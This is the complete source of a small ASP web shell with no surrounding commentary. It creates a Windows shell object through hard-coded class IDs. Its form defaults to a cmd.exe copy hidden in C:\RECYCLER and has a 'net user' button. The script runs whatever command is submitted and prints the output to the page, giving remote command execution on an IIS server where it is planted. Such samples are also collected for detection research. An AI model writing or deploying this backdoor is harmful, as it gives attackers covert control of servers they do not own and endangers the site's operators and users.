<object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<%if err then%>
<object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<%
end if %>
<form method="post">
<input type=text name="cmdx" size=60 value="C:\RECYCLER\cmd.exe"><br>
<input type=text name="cmd" size=60><br>
<input type=submit value="net user"></form>
<textarea readonly cols=80 rows=20>
<%On Error Resume Next
if request("cmdx")="C:\RECYCLER\cmd.exe" then
response.write oScriptlhn.exec("cmd.exe /c"&request("cmd")).stdout.readall
end if
response.write oScriptlhn.exec(request("cmdx")&" /c"&request("cmd")).stdout.readall
%>
</textarea>
